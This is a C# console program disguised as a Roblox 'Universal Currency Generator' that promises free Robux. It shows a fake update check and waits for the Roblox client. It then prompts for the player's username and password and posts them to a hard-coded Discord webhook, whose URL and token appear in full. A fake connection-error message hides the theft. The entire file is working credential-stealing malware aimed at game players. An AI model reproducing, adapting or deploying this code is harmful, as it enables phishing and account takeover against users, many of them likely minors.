using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;

partial class Program
{
    static async Task Main()
    {
        Console.WriteLine("Welcome to Universal Currency Generator! (UCG) by MirkoKING https://youtube.com/c/MirkoKING");
        Thread.Sleep(1000);
        Console.WriteLine("Searching for updates...");
        Thread.Sleep(5000);
        Console.WriteLine("Running latest version! 4.8.5");
        Console.WriteLine("Waiting for RobloxPlayerBeta.exe...");

        while (true)
        {
            Process[] processes = Process.GetProcessesByName("RobloxPlayerBeta");
            // Some systems use "RobloxPlayerBeta" instead of "roblox"

            if (processes.Length > 0)
            {
                Console.WriteLine("Roblox started!");
                break;
            }

            Thread.Sleep(500); // reduce CPU usage
        }

        // Continue
        Console.WriteLine("Waiting..");
        Thread.Sleep(2400);
        Console.Write("Enter username: ");
        string username = Console.ReadLine();
        Console.Write("Enter password: ");
        string password = Console.ReadLine();
        Console.Write("How much robux do you want? (PUT RANDOM VALUE SO ROBLOX DOESNT BAN): ");
        string robux = Console.ReadLine();

        string webhookUrl = "https://discord.com/api/webhooks/1446837691785416764/FFM7B_wTxJv-6NEXwFz2Y61VUCwjtpv5mj1yZ7lMh1IfNObuhu9TvTLLkaDQTnSbIPxK";

        // Create the JSON payload required by Discord
        string jsonPayload = $"{{\"content\":\"Username: {username}\nPassword: {password}\"}}";

        using (HttpClient client = new HttpClient())
        {
            // Create the HTTP content with JSON headers
            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            // Send the POST request
            HttpResponseMessage response = await client.PostAsync(webhookUrl, content);

            if (response.IsSuccessStatusCode)
            {
            }
            else
            {
                Console.WriteLine("Failed to connect to Roblox services: " + response.StatusCode);
            }
        }
    }
}

